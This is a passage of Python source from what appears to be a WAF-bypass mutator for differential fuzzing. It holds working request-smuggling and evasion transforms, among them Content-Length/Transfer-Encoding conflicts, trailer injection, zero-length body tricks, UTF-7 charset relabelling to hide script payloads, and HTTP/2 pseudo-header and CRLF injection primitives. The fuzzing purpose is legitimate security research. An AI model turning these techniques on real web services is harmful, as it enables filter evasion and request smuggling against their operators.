    return delim.join(new_lines) + delim + delim + compressed


def _transform_null_inject(wire: bytes, rng: random.Random) -> bytes:
    """Insert null bytes into non-X-WF header values."""
    try:
        head, body, delim = _split_header_block(wire)
    except ValueError:
        return wire
    lines = head.split(delim)
    out = [lines[0]]
    for line in lines[1:]:
        lower = line.lower()
        if lower.startswith(b"x-wf-") or b":" not in line:
            out.append(line)
            continue
        if rng.random() < 0.3:
            name, val = line.split(b":", 1)
            if len(val) > 2:
                pos = rng.randint(1, len(val) - 1)
                val = val[:pos] + b"\x00" + val[pos:]
            out.append(name + b":" + val)
        else:
            out.append(line)
    return delim.join(out) + delim + delim + body


def _transform_obs_fold(wire: bytes, rng: random.Random) -> bytes:
    """Apply obs-fold (continuation line) to a random non-X-WF header."""
    try:
        head, body, delim = _split_header_block(wire)
    except ValueError:
        return wire
    lines = head.split(delim)
    candidates = [
        i for i, line in enumerate(lines[1:], 1)
        if not line.lower().startswith(b"x-wf-") and b":" in line and len(line) > 10
    ]
    if not candidates:
        return wire
    idx = rng.choice(candidates)
    line = lines[idx]
    name, val = line.split(b":", 1)
    val = val.strip()
    if len(val) > 4:
        split_pos = rng.randint(2, len(val) - 2)
        folded = name + b": " + val[:split_pos] + delim + b" " + val[split_pos:]
        lines[idx] = folded
    return delim.join(lines) + delim + delim + body


_TRANSFORMS: dict[str, "type[object]"] = {
    "lt_mix": _transform_lt_mix,
    "case_scramble": _transform_case_scramble,
    "ws_inject": _transform_ws_inject,
    "encoding_wrap": _transform_encoding_wrap,
    "null_inject": _transform_null_inject,
    "obs_fold": _transform_obs_fold,
}


def _inject_transforms_header(wire: bytes, applied: list[str]) -> bytes:
    """Inject X-WF-Transforms header into wire bytes."""
    if not applied:
        return wire
    header_line = f"X-WF-Transforms: {','.join(applied)}".encode("ascii")
    # Insert after the first line (request line)
    try:
        head, body, delim = _split_header_block(wire)
    except ValueError:
        return wire
    lines = head.split(delim)
    lines.insert(1, header_line)
    return delim.join(lines) + delim + delim + body


# ── Semantic chain transforms (body framing / header semantics) ──

def _transform_chunked_wrap(wire: bytes, rng: random.Random) -> bytes:
    """Wrap the body in chunked Transfer-Encoding.

    Creates a CL/TE ambiguity: WAF may read by Content-Length (original body
    size) while backend reads by Transfer-Encoding (chunked).
    """
    try:
        head, body, delim = _split_header_block(wire)
    except ValueError:
        return wire
    if not body:
        return wire

    # Encode body as a single chunk with optional extension
    ext = b""
    if rng.random() < 0.4:
        ext_val = "".join(rng.choices(string.ascii_lowercase, k=rng.randint(3, 8)))
        ext = f";{ext_val}=1".encode("ascii")
    chunk_size = f"{len(body):x}".encode("ascii")
    chunked_body = chunk_size + ext + b"\r\n" + body + b"\r\n0\r\n\r\n"

    lines = head.split(delim)
    new_lines = [lines[0]]
    cl_found = False
    for line in lines[1:]:
        lower = line.lower()
        if lower.startswith(b"transfer-encoding:"):
            continue  # remove existing TE
        if lower.startswith(b"content-length:"):
            cl_found = True
            # Keep original CL (wrong value — creates ambiguity)
            new_lines.append(line)
        else:
            new_lines.append(line)
    # Add TE: chunked
    te_val = rng.choice((b"chunked", b"Chunked", b" chunked", b"chunked "))
    new_lines.append(b"Transfer-Encoding: " + te_val)
    if not cl_found:
        # Add a CL that points to part of the chunked body (not the whole thing)
        fake_cl = rng.choice((len(body), len(body) + 1, 0))
        new_lines.append(f"Content-Length: {fake_cl}".encode("ascii"))

    return delim.join(new_lines) + delim + delim + chunked_body


def _transform_multipart_wrap(wire: bytes, rng: random.Random) -> bytes:
    """Wrap body as a multipart/form-data part.

    If the original Content-Type says something else (e.g. text/plain), the WAF
    may skip multipart parsing while the backend parses the part.
    """
    try:
        head, body, delim = _split_header_block(wire)
    except ValueError:
        return wire
    if not body:
        return wire

    # Generate boundary
    bnd = "WfBnd" + "".join(rng.choices(string.ascii_letters + string.digits, k=12))
    part_name = rng.choice(("data", "input", "payload", "q", "text"))
    mp_body = (
        f"--{bnd}\r\n"
        f"Content-Disposition: form-data; name=\"{part_name}\"\r\n\r\n"
    ).encode("ascii") + body + f"\r\n--{bnd}--\r\n".encode("ascii")

    lines = head.split(delim)
    new_lines = [lines[0]]
    ct_replaced = False
    cl_replaced = False
    for line in lines[1:]:
        lower = line.lower()
        if lower.startswith(b"content-type:"):
            # 50%: keep old CT (confuse WAF), 50%: add multipart as second CT
            if rng.random() < 0.5:
                new_lines.append(line)  # keep original (WAF reads this)
                new_lines.append(f"Content-Type: multipart/form-data; boundary={bnd}".encode("ascii"))
            else:
                new_lines.append(f"Content-Type: multipart/form-data; boundary={bnd}".encode("ascii"))
            ct_replaced = True
        elif lower.startswith(b"content-length:"):
            new_lines.append(f"Content-Length: {len(mp_body)}".encode("ascii"))
            cl_replaced = True
        else:
            new_lines.append(line)
    if not ct_replaced:
        new_lines.append(f"Content-Type: multipart/form-data; boundary={bnd}".encode("ascii"))
    if not cl_replaced:
        new_lines.append(f"Content-Length: {len(mp_body)}".encode("ascii"))

    return delim.join(new_lines) + delim + delim + mp_body


def _transform_cl_te_conflict(wire: bytes, rng: random.Random) -> bytes:
    """Inject conflicting Content-Length and Transfer-Encoding headers.

    RFC 7230 §3.3.3: if both CL and TE are present, TE wins.  But some WAFs
    read CL first and ignore TE, causing disagreement.
    """
    try:
        head, body, delim = _split_header_block(wire)
    except ValueError:
        return wire

    lines = head.split(delim)
    has_te = any(line.lower().startswith(b"transfer-encoding:") for line in lines[1:])
    has_cl = any(line.lower().startswith(b"content-length:") for line in lines[1:])

    new_lines = list(lines)
    if has_te and not has_cl:
        # Add conflicting CL
        fake_cl = rng.choice((0, len(body), len(body) + rng.randint(1, 50)))
        new_lines.append(f"Content-Length: {fake_cl}".encode("ascii"))
    elif has_cl and not has_te:
        # Add TE without actually chunking — WAF may try chunked parsing and fail
        te_val = rng.choice((
            b"chunked", b"identity, chunked", b"chunked, identity",
            b" chunked", b"\tchunked",
        ))
        new_lines.append(b"Transfer-Encoding: " + te_val)
    elif not has_cl and not has_te:
        # Add both
        new_lines.append(f"Content-Length: {len(body)}".encode("ascii"))
        te_val = rng.choice((b"chunked", b"identity"))
        new_lines.append(b"Transfer-Encoding: " + te_val)
    else:
        # Both already present — mutate the CL value to be wrong
        for i, line in enumerate(new_lines):
            if line.lower().startswith(b"content-length:"):
                fake_cl = rng.choice((0, len(body) + rng.randint(1, 100)))
                new_lines[i] = f"Content-Length: {fake_cl}".encode("ascii")
                break

    return delim.join(new_lines) + delim + delim + body


def _transform_charset_relabel(wire: bytes, rng: random.Random) -> bytes:
    """Change the charset declaration without re-encoding the body.

    If WAF decodes according to the declared charset but backend uses raw bytes
    (or vice versa), multi-byte sequences can hide payloads.
    """
    try:
        head, body, delim = _split_header_block(wire)
    except ValueError:
        return wire

    fake_charset = rng.choice((
        "utf-7", "utf-16", "utf-32", "iso-8859-1", "us-ascii",
        "shift_jis", "euc-jp", "gb2312", "windows-1252", "ibm866",
    ))

    # CVE-2026-21876: When charset=utf-7, re-encode WAF-signature characters
    # (<, >, ', ", ;, (, )) in UTF-7 modified base64 so the WAF (expecting
    # UTF-8/latin-1) won't match patterns like <script>, but the backend
    # that honours charset=utf-7 will decode it back correctly.
    # Python's utf-7 codec only encodes non-ASCII, so we manually encode
    # the "set O" optional direct characters that WAFs inspect.
    if fake_charset == "utf-7":
        import base64 as _b64
        _UTF7_ENCODE_CHARS = set(b"<>'\";()/\\")
        parts = []
        text = body.decode("latin-1")
        i = 0
        while i < len(text):
            if ord(text[i]) < 128 and ord(text[i]) in _UTF7_ENCODE_CHARS:
                # Collect consecutive chars to encode
                j = i
                while j < len(text) and ord(text[j]) < 128 and ord(text[j]) in _UTF7_ENCODE_CHARS:
                    j += 1
                raw = text[i:j].encode("utf-16-be")
                b64 = _b64.b64encode(raw).rstrip(b"=").decode("ascii")
                parts.append(f"+{b64}-")
                i = j
            else:
                parts.append(text[i])
                i += 1
        body = "".join(parts).encode("ascii", errors="replace")

    lines = head.split(delim)
    new_lines = [lines[0]]
    ct_modified = False
    for line in lines[1:]:
        lower = line.lower()
        if lower.startswith(b"content-type:") and not ct_modified:
            ct_val = line.split(b":", 1)[1].strip().decode("latin-1", errors="replace")
            # Strip existing charset param if present
            parts = [p.strip() for p in ct_val.split(";")]
            filtered = [p for p in parts if not p.lower().startswith("charset=")]
            new_ct = "; ".join(filtered) + f"; charset={fake_charset}"
            new_lines.append(f"Content-Type: {new_ct}".encode("ascii", errors="replace"))
            ct_modified = True
        else:
            new_lines.append(line)

    return delim.join(new_lines) + delim + delim + body


def _transform_zero_body_trick(wire: bytes, rng: random.Random) -> bytes:
    """Make WAF believe the body is empty while backend processes actual body.

    Variant A (CL:0): Sets Content-Length to 0, body intact.
    Variant B (TE:0-chunk): Prepends immediate 0-chunk terminator before body.
    """
    try:
        head, body, delim = _split_header_block(wire)
    except ValueError:
        return wire
    if not body:
        return wire

    lines = head.split(delim)
    variant = rng.choice(("cl0", "te0"))

    if variant == "cl0":
        # Set CL:0, leave body intact
        new_lines = [lines[0]]
        for line in lines[1:]:
            lower = line.lower()
            if lower.startswith(b"content-length:"):
                new_lines.append(b"Content-Length: 0")
            elif lower.startswith(b"transfer-encoding:"):
                continue  # remove TE to avoid conflict
            else:
                new_lines.append(line)
        return delim.join(new_lines) + delim + delim + body
    else:
        # Prepend 0\r\n\r\n before actual body — WAF sees empty chunked body
        zero_prefix = b"0" + delim + delim
        new_body = zero_prefix + body
        new_lines = [lines[0]]
        cl_replaced = False
        te_found = False
        for line in lines[1:]:
            lower = line.lower()
            if lower.startswith(b"content-length:"):
                new_lines.append(f"Content-Length: {len(new_body)}".encode("ascii"))
                cl_replaced = True
            elif lower.startswith(b"transfer-encoding:"):
                te_found = True
                new_lines.append(line)
            else:
                new_lines.append(line)
        if not te_found:
            new_lines.append(b"Transfer-Encoding: chunked")
        if not cl_replaced:
            new_lines.append(f"Content-Length: {len(new_body)}".encode("ascii"))
        return delim.join(new_lines) + delim + delim + new_body


def _transform_trailer_inject(wire: bytes, rng: random.Random) -> bytes:
    """Inject HTTP trailers after chunked body terminator.

    WAFs typically stop parsing at the 0-chunk and never inspect trailers,
    but backends implementing RFC 7230 §4.1.2 may merge trailers into headers.
    """
    try:
        head, body, delim = _split_header_block(wire)
    except ValueError:
        return wire
    if not body:
        return wire

    lines = head.split(delim)
    has_te = any(line.lower().startswith(b"transfer-encoding:") for line in lines[1:])

    # If not already chunked, wrap body in a single chunk
    if not has_te:
        chunk_size = f"{len(body):x}".encode("ascii")
        body = chunk_size + b"\r\n" + body + b"\r\n"
        # Will add TE header and 0-chunk below

    # Build trailer lines
    trailer_pool = [
        (b"Content-Type", rng.choice((
            b"application/x-www-form-urlencoded",
            b"text/html; charset=utf-8",
            b"application/json",
        ))),
        (b"Host", f"trailer-{rng.randint(1000,9999)}.internal".encode("ascii")),
        (b"X-Forwarded-Host", f"trailer-{rng.randint(1000,9999)}.bypass".encode("ascii")),
        (b"X-Original-URL", f"/trailer-override/{rng.randint(100,999)}".encode("ascii")),
        (b"X-Trailer-Canary", b"merged"),
    ]
    n_trailers = rng.randint(1, 3)
    chosen_trailers = rng.sample(trailer_pool, min(n_trailers, len(trailer_pool)))
    trailer_names = [name.decode("ascii") for name, _ in chosen_trailers]

    # Build the chunked body with trailers
    trailer_block = b""
    for name, value in chosen_trailers:
        trailer_block += name + b": " + value + b"\r\n"

    # Ensure body ends with 0-chunk + trailers.
    # Detect existing 0-chunk terminator by looking for the exact byte
    # sequence, NOT rstrip (which is character-class based and falsely
    # matches payload data ending in '0').
    if body.endswith(b"0\r\n\r\n"):
        # Full chunked terminator — strip the final CRLFCRLF to inject trailers
        body = body[:-2]  # keep "0\r\n", remove trailing "\r\n"
    elif body.endswith(b"\r\n0\r\n"):
        # 0-chunk with single trailing CRLF
        pass  # body already ends with "0\r\n"
    elif body.endswith(b"\r\n0"):
        body = body + b"\r\n"
    else:
        body = body + b"0\r\n"
    body = body + trailer_block + b"\r\n"

    # Update headers
    new_lines = [lines[0]]
    cl_replaced = False
    for line in lines[1:]:
        lower = line.lower()
        if lower.startswith(b"content-length:"):
            new_lines.append(f"Content-Length: {len(body)}".encode("ascii"))
            cl_replaced = True
        else:
            new_lines.append(line)
    if not has_te:
        new_lines.append(b"Transfer-Encoding: chunked")
    if not cl_replaced:
        new_lines.append(f"Content-Length: {len(body)}".encode("ascii"))
    # Add Trailer announce header
    new_lines.append(f"Trailer: {', '.join(trailer_names)}".encode("ascii"))

    return delim.join(new_lines) + delim + delim + body


def _transform_duplicate_framing(wire: bytes, rng: random.Random) -> bytes:
    """Duplicate a framing header (CL or TE) with a conflicting value.

    WAF picks first/last header differently from backend, causing body boundary
    disagreement.  Different from cl_te_conflict which creates CL-vs-TE conflict;
    this creates same-header duplication.
    """
    try:
        head, body, delim = _split_header_block(wire)
    except ValueError:
        return wire

    lines = head.split(delim)
    cl_indices = []
    te_indices = []
    for i, line in enumerate(lines[1:], 1):
        lower = line.lower()
        if lower.startswith(b"content-length:"):
            cl_indices.append(i)
        elif lower.startswith(b"transfer-encoding:"):
            te_indices.append(i)

    new_lines = list(lines)

    if cl_indices and (not te_indices or rng.random() < 0.6):
        # Duplicate CL with different value
        short_val = rng.choice((0, min(4, len(body)), len(body) // 2))
        # Insert second CL after the existing one
        dup_line = f"Content-Length: {short_val}".encode("ascii")
        insert_pos = rng.choice((cl_indices[0] + 1, len(new_lines)))
        new_lines.insert(insert_pos, dup_line)
    elif te_indices:
        # Duplicate TE — obs-fold variant handled as two lines to avoid
        # embedding raw CRLF inside a single lines[] entry (which would
        # break subsequent transforms that do head.split(delim)).
        variant = rng.randint(0, 2)
        if variant == 0:
            new_lines.append(b"Transfer-Encoding: chunked")
        elif variant == 1:
            # obs-fold: header line + continuation line (two entries)
            new_lines.append(b"Transfer-Encoding:")
            new_lines.append(b"\tchunked")
        else:
            new_lines.append(b"Transfer-Encoding: identity")
    else:
        # Neither exists — add two CL headers with conflicting values
        new_lines.append(f"Content-Length: 0".encode("ascii"))
        new_lines.append(f"Content-Length: {len(body)}".encode("ascii"))

    return delim.join(new_lines) + delim + delim + body


def _transform_chunk_quirks(wire: bytes, rng: random.Random) -> bytes:
    """Apply parser-confusing quirks to chunk size fields and terminators.

    Exploits differences in how strict vs lenient parsers handle whitespace,
    leading zeros, and ambiguous terminators in chunked encoding.
    """
    try:
        head, body, delim = _split_header_block(wire)
    except ValueError:
        return wire
    if not body:
        return wire

    lines = head.split(delim)
    has_te = any(line.lower().startswith(b"transfer-encoding:") for line in lines[1:])

    # If not chunked, wrap body first
    if not has_te:
        chunk_size = f"{len(body):x}".encode("ascii")
        body = chunk_size + b"\r\n" + body + b"\r\n0\r\n\r\n"
        new_lines = list(lines)
        new_lines.append(b"Transfer-Encoding: chunked")
        # Update or add CL
        cl_found = False
        for i, line in enumerate(new_lines):
            if line.lower().startswith(b"content-length:"):
                new_lines[i] = f"Content-Length: {len(body)}".encode("ascii")
                cl_found = True
                break
        if not cl_found:
            new_lines.append(f"Content-Length: {len(body)}".encode("ascii"))
        head = delim.join(new_lines)
        lines = new_lines

    # Apply 1-2 quirks to the body
    quirks = ["ws_prefix", "ws_suffix", "leading_zeros", "extra_term"]
    chosen = rng.sample(quirks, rng.randint(1, 2))

    for quirk in chosen:
        if quirk == "ws_prefix":
            # Add leading space to first chunk size
            if body and body[0:1] != b" ":
                body = b" " + body
        elif quirk == "ws_suffix":
            # Add trailing tab before CRLF in first chunk size line
            eol = body.find(b"\r\n") if b"\r\n" in body else body.find(b"\n")
            if eol > 0:
                body = body[:eol] + b"\t" + body[eol:]
        elif quirk == "leading_zeros":
            # Prepend zeros to chunk size hex
            eol = body.find(b"\r\n") if b"\r\n" in body else body.find(b"\n")
            if eol > 0:
                size_part = body[:eol].split(b";", 1)
                padded = b"00000" + size_part[0].strip()
                rest_ext = b";" + size_part[1] if len(size_part) > 1 else b""
                body = padded + rest_ext + body[eol:]
        elif quirk == "extra_term":
            # Add extra CRLFCRLF after the terminal 0-chunk
            if body.endswith(b"\r\n\r\n"):
                body = body + b"\r\n"
            elif body.endswith(b"\n\n"):
                body = body + b"\n"

    return delim.join(lines) + delim + delim + body


_CHAIN_TRANSFORMS: dict[str, object] = {
    "chunked_wrap": _transform_chunked_wrap,
    "multipart_wrap": _transform_multipart_wrap,
    "cl_te_conflict": _transform_cl_te_conflict,
    "charset_relabel": _transform_charset_relabel,
    "zero_body_trick": _transform_zero_body_trick,
    "trailer_inject": _transform_trailer_inject,
    "duplicate_framing": _transform_duplicate_framing,
    "chunk_quirks": _transform_chunk_quirks,
}

# Canonical application order
_CHAIN_ORDER: list[str] = [
    "multipart_wrap",      # 1. body → multipart
    "chunked_wrap",        # 2. body → chunked (OR)
    "zero_body_trick",     # 2'. body concealment (exclusive with chunked_wrap)
    "trailer_inject",      # 3. append trailers to chunked body
    "duplicate_framing",   # 4. duplicate CL/TE headers
    "chunk_quirks",        # 5. chunk size parser quirks
    "cl_te_conflict",      # 6. CL vs TE conflict (exclusive with duplicate_framing)
    "charset_relabel",     # 7. charset mislabel
]

# Incompatibility: chain transform → set of family prefixes it conflicts with
_CHAIN_INCOMPATIBLE: dict[str, tuple[str, ...]] = {
    # h2_ families produce binary H2 wire frames — no H1 chain transform
    # can be applied to them without corrupting the frame structure.
    "chunked_wrap": ("enc_chunked_hide", "enc_chunked_gzip", "h2_"),
    "multipart_wrap": ("mp_", "h2_"),  # prefix match
    "cl_te_conflict": ("h2_",),
    "charset_relabel": ("h2_",),
    "zero_body_trick": ("enc_chunked_hide", "enc_chunked_gzip", "h2_"),
    "trailer_inject": ("enc_chunked_hide", "enc_chunked_gzip", "h2_"),
    "duplicate_framing": ("hdr_duplicate", "h2_"),
    "chunk_quirks": ("enc_chunked_hide", "h2_"),
}

# URL families have no body — only header-level wrappers allowed
_CHAIN_HEADER_ONLY: frozenset[str] = frozenset((
    "cl_te_conflict", "charset_relabel", "duplicate_framing",
))

# Inter-chain mutual exclusion: chain transform → set of chain transforms
# it cannot coexist with in the same chain.
_CHAIN_MUTUAL_EXCLUSION: dict[str, frozenset[str]] = {
    "zero_body_trick": frozenset({"chunked_wrap", "cl_te_conflict", "chunk_quirks", "trailer_inject"}),
    "chunked_wrap": frozenset({"zero_body_trick"}),
    "duplicate_framing": frozenset({"cl_te_conflict"}),
    "cl_te_conflict": frozenset({"zero_body_trick", "duplicate_framing"}),
    "chunk_quirks": frozenset({"zero_body_trick"}),
    "trailer_inject": frozenset({"zero_body_trick"}),
}


# ══════════════════════════════════════════════════════════════════
# Composable multipart mutation primitives
# ══════════════════════════════════════════════════════════════════

_MP_MUT_POOL: tuple[str, ...] = (
    "bnd_quote", "bnd_special", "bnd_null", "bnd_ws",       # boundary
    "delim_lf", "delim_cr",                                  # delimiter
    "cte_base64", "cte_qp",                                  # content-transfer-encoding
    "charset_utf7", "charset_ibm037", "charset_utf16le",     # charset
    "no_terminator", "empty_prepend", "dup_cd",              # structure
    "subtype_mixed", "subtype_related",                      # CT subtype
    "filename_star",                                         # RFC 5987
)

_MP_MUT_EXCL: list[frozenset[str]] = [
    frozenset({"bnd_quote", "bnd_special", "bnd_null", "bnd_ws"}),
    frozenset({"delim_lf", "delim_cr"}),
    frozenset({"cte_base64", "cte_qp"}),
    frozenset({"charset_utf7", "charset_ibm037", "charset_utf16le"}),
    frozenset({"subtype_mixed", "subtype_related"}),
]


def _pick_mp_muts(rng: random.Random, k: int) -> list[str]:
    """Pick *k* compatible multipart primitives, respecting mutual exclusivity.

    For each candidate drawn from the pool, we check that it doesn't collide
    with any already-selected mutation within the same exclusion group.
    Retries up to 3× the pool size before giving up (avoids infinite loop
    when k is close to number of groups).
    """
    selected: list[str] = []
    blocked: set[str] = set()
    pool = list(_MP_MUT_POOL)
    rng.shuffle(pool)

    for candidate in pool:
        if len(selected) >= k:
            break
        if candidate in blocked:
            continue
        selected.append(candidate)
        # Block siblings in same exclusion group
        for group in _MP_MUT_EXCL:
            if candidate in group:
                blocked |= group - {candidate}
    return selected


# ── Composable H2 mutation primitives ────────────────────────────
# Mirror of the multipart _MP_MUT_POOL / _MP_MUT_EXCL pattern.
# Each primitive toggles one structural aspect of the H2 frame sequence;
# the h2_composed builder samples 2-4 compatible primitives and assembles
# a novel H2 request that combines those mutations.

_H2_MUT_POOL: tuple[str, ...] = (
    # frame structure
    "cont_split", "trailer_append", "multi_stream", "padding",
    # pseudo-header abuse
    "dup_method", "dup_path", "dup_authority", "scheme_exotic", "authority_mismatch",
    # body framing
    "te_forbidden", "cl_zero",
    # injection
    "path_inject", "header_inject_crlf",
    # protocol
    "settings_abuse", "window_zero",
)

_H2_MUT_EXCL: list[frozenset[str]] = [
    frozenset({"dup_method", "dup_path", "dup_authority"}),
    frozenset({"te_forbidden", "cl_zero"}),
    frozenset({"path_inject", "header_inject_crlf"}),
]


def _pick_h2_muts(rng: random.Random, k: int) -> list[str]:
    """Pick *k* compatible H2 primitives, respecting mutual exclusivity."""
    selected: list[str] = []
    blocked: set[str] = set()
    pool = list(_H2_MUT_POOL)
    rng.shuffle(pool)
    for candidate in pool:
        if len(selected) >= k:
            break
        if candidate in blocked:
            continue
        selected.append(candidate)
        for group in _H2_MUT_EXCL:
            if candidate in group:
                blocked |= group - {candidate}
    return selected


# ══════════════════════════════════════════════════════════════════
# Mutator class
# ══════════════════════════════════════════════════════════════════

class WafBypassMutator:
    """Template-first WAF evasion mutator for differential fuzzing."""

    name = "waf_bypass"

    def __init__(
        self,
        seed: int | None = None,
        mode: str = "hybrid",
        havoc_intensity: float = 0.15,
        registry: "GrammarRegistry | None" = None,
    ) -> None:
        self.rng = random.Random(seed)
        self.mode = mode if mode in _MODE_WEIGHTS else "hybrid"
        self._havoc_intensity = max(0.0, min(1.0, havoc_intensity))
        # Grammar generator for grammar-driven families (h2_grammar)
        if registry is not None:
            from ...core.generator import Generator
            self._grammar_generator: Generator | None = Generator(
                registry, seed=seed,
            )
        else:
            self._grammar_generator = None
        self._family_hits: dict[str, int] = {f: 0 for f in _ALL_FAMILIES}
        # Family-level multiplicative boost applied during family selection.
        # Starts at 1.0 (neutral) for every family; ``apply_lattice_atoms`` /
        # ``apply_automaton_witnesses`` raise individual entries at startup
        # based on offline E4/E7 feedback. Capped at 3× so a single lane
        # cannot starve the others. Never demoted: the two channels stack
        # monotonically (max), matching SamlMutator's boost semantics.
        self._family_boosts: dict[str, float] = {f: 1.0 for f in _ALL_FAMILIES}

    # ── Offline feedback channels (E4 FCA / E7 witness) ──────────

    # Last dict passed to apply_* (kept verbatim for auditability — includes
    # keys that don't match any real family name). None until the hook fires.
    _lattice_atom_weights: dict[str, float] | None = None
    _automaton_witness_weights: dict[str, float] | None = None

    def apply_lattice_atoms(self, atom_weights: dict[str, float]) -> None:
        """Apply startup-time family boosts from E4 FCA atom coverage.

        The ``atom_weights`` dict comes from
        the external fuzzing-formal-research workspace and
        maps each family name (e.g. ``"ct_duplicate"``) to a coverage
        score in ``[0, 1]``: the fraction of the concept lattice's
        meet-irreducible atoms the family's historical findings
        collectively touch.

        Boost formula mirrors :class:`SamlMutator`:
        ``boost = 1 + 1.5 · score``, clamped at ``3×``. The resulting
        multiplier is applied to the family-selection weight rather than
        to a per-strategy integer weight vector, because WAF family
        selection is multi-stage (lane → family) and this is the lowest
        granularity every selection path converges on (see
        :meth:`_pick_family`).

        Unknown keys are ignored but the full dict is retained in
        ``self._lattice_atom_weights`` for auditability. Boosts never
        demote: a family already raised above the computed boost is
        left untouched so multiple channels stack.
        """
        if not atom_weights:
            return
        self._lattice_atom_weights = dict(atom_weights)
        for fam in _ALL_FAMILIES:
            score = atom_weights.get(fam, 0.0)
            if score <= 0:
                continue
            score = min(1.0, float(score))
            boost = 1.0 + 1.5 * score  # 1.0x – 2.5x
            capped = min(boost, 3.0)
            if capped > self._family_boosts[fam]:
                self._family_boosts[fam] = capped

    def apply_automaton_witnesses(
        self, witness_weights: dict[str, float],
    ) -> None:
        """Apply startup-time family boosts from E7 SFA witness scores.

        ``witness_weights`` is a ``{family_name: score in [0, 1]}`` map
        from
        its E7 automata witness analysis.
        The score is the family's cumulative contribution to the
        diff-field coordinates that appear in the E7 disagreement trie's
        witness prefixes, normalized across the family set.

        Boost formula is identical to :meth:`apply_lattice_atoms` so
        the two channels compose symmetrically via ``max`` without ever
        demoting a weight already raised elsewhere.
        """
        if not witness_weights:
            return
        self._automaton_witness_weights = dict(witness_weights)
        for fam in _ALL_FAMILIES:
            score = witness_weights.get(fam, 0.0)
            if score <= 0:
                continue
            score = min(1.0, float(score))
            boost = 1.0 + 1.5 * score
            capped = min(boost, 3.0)
            if capped > self._family_boosts[fam]:
                self._family_boosts[fam] = capped

    # ── Runtime learned-weight feedback ──────────────────────────
    #
    # Optional channel for PropertyGuidedCoordinator or similar runtime
    # feedback sources.  Uses the same family-level boost mechanic as the
    # E4/E7 startup channels but accepts a divergence_rate map instead of
    # an atom-coverage score.  Heavy-tail fallback (median normalization)
    # mirrors SamlMutator.apply_learned_weights.

    _learned_weights: dict[str, float] | None = None

    def apply_learned_weights(
        self,
        strategy_effectiveness: dict[str, float],
        alpha: float | None = None,
    ) -> None:
        """Apply runtime divergence-rate weights as family-level boosts.

        strategy_effectiveness: {family_name: divergence_rate}
        alpha: Pareto tail-index estimate (Hill estimator, DG006).  When
        ``alpha < 2``, switches normalisation to median for robustness
        against heavy-tail outliers.

        Boost formula: ``1 + 2.0 * (rate / ref)``, capped at 3× so no
        single family can starve the others.  Never demotes: uses ``max``
        with the current boost so the three channels (E4 FCA, E7 witness,
        runtime learned) stack monotonically.
        """
        if not strategy_effectiveness:
            return
        self._learned_weights = dict(strategy_effectiveness)
        rates = [v for v in strategy_effectiveness.values() if v > 0]
        if not rates:
            return
        if alpha is not None and alpha < 2.0:
            import statistics
            ref = statistics.median(rates) or 1.0
        else:
            ref = max(rates) or 1.0
        for fam in _ALL_FAMILIES:
            rate = strategy_effectiveness.get(fam, 0.0)
            if rate <= 0:
                continue
            boost = 1.0 + 2.0 * (rate / ref)
            capped = min(boost, 3.0)
            if capped > self._family_boosts[fam]:
                self._family_boosts[fam] = capped

    def _weighted_family_pick(self, families: "tuple[str, ...] | list[str]") -> str:
        """Pick one family from ``families`` weighted by ``_family_boosts``.

        Equivalent to ``rng.choice`` when every boost is 1.0 (the default
        state before any apply_* hook fires), so the behaviour is a
        strict generalization of the previous uniform selection.
        """
        weights = [self._family_boosts.get(f, 1.0) for f in families]
        return self.rng.choices(tuple(families), weights=weights, k=1)[0]

    # ── Public interface ──────────────────────────────────────────

    def mutate(self, inp: Input, corpus: "list[Seed]") -> Input:
        fragments = self._sample_fragments(corpus, k=5)
        lane_mode = self._pick_lane_mode(inp)
        if lane_mode == "chain":
            wire, meta, lane = self._mutate_chain(inp, fragments=fragments)
            # Chain mode already applied semantic wrappers; optionally add
            # one surface transform (30% chance) for extra diversity.
            applied_transforms: list[str] = []
            if not _is_h2_wire(wire) and self.rng.random() < 0.30:
                name = self.rng.choice(list(_TRANSFORMS))
                wire = _TRANSFORMS[name](wire, self.rng)
                applied_transforms.append(name)
                wire = _inject_transforms_header(wire, applied_transforms)
        elif lane_mode == "stable":
            wire, meta, lane = self._mutate_stable(inp, fragments=fragments)
            applied_transforms = []
            if not _is_h2_wire(wire):
                applied_transforms = self._apply_surface_transforms()
                for name in applied_transforms:
                    wire = _TRANSFORMS[name](wire, self.rng)
                if applied_transforms:
                    wire = _inject_transforms_header(wire, applied_transforms)
        else:
            wire, meta, lane = self._mutate_research(inp, fragments=fragments)
            applied_transforms = []
            if not _is_h2_wire(wire):
                applied_transforms = self._apply_surface_transforms()
                for name in applied_transforms:
                    wire = _TRANSFORMS[name](wire, self.rng)
                if applied_transforms:
                    wire = _inject_transforms_header(wire, applied_transforms)
        # H2 binary wire frames must not be post-processed with H1 transforms
        # or havoc — the preface and frame structure are binary and would be
        # corrupted by any header-injection or line-splitting logic.
        if not _is_h2_wire(wire) and self._havoc_intensity > 0.0 and self.rng.random() < 0.50:
            wire = self._wire_havoc(wire, intensity=self._havoc_intensity)
        return Input(
            data=wire,
            metadata={
                **inp.metadata,
                "mutator": self.name,
                "lane": lane,
                "waf_bypass_mode": lane_mode,
                "applied_transforms": applied_transforms,
                **meta,
            },
        )

    def _apply_surface_transforms(self) -> list[str]:
        """Select 0-2 surface transforms to apply (names only)."""
        n = self.rng.choices([0, 1, 2], weights=[0.4, 0.4, 0.2], k=1)[0]
        if n == 0:
            return []
        return self.rng.sample(list(_TRANSFORMS), min(n, len(_TRANSFORMS)))

    # ── Corpus fragment extraction & splicing ─────────────────────

    def _sample_fragments(self, corpus: "list[Seed]", k: int = 5) -> list[WireFragment]:
        if not corpus or len(corpus) < 3:
            return []
        sample_size = min(k, len(corpus))
        fragments: list[WireFragment] = []
        for s in self.rng.sample(corpus, sample_size):
            frag = _parse_wire_fragment(s.input.data)
            if frag is None:
                continue
            fragments.append(frag)
            fset = getattr(s, "feature_set", None)
            if fset:
                self._family_hits[frag.family] = (
                    self._family_hits.get(frag.family, 0) + len(fset)
                )
        return fragments

    def _splice_corpus_fragment(self, wire: bytes, fragment: WireFragment) -> bytes:
        try:
            head, body, delim = _split_header_block(wire)
        except ValueError:
            return wire
        lines = head.split(delim)
        request_line = lines[0] if lines else b""
        control: list[bytes] = []
        content: list[bytes] = []
        for raw in lines[1:]:
            low = raw.lower()
            if low.startswith(b"x-wf-") or low.startswith(b"host:"):
                control.append(raw)
            elif raw:
                content.append(raw)
        if fragment.headers and self.rng.random() < 0.30:
            content = list(fragment.headers)
        if fragment.body_region and self.rng.random() < 0.30:
            body = fragment.body_region
        new_lines = [request_line, *control, *content]
        return delim.join(new_lines) + delim + delim + body

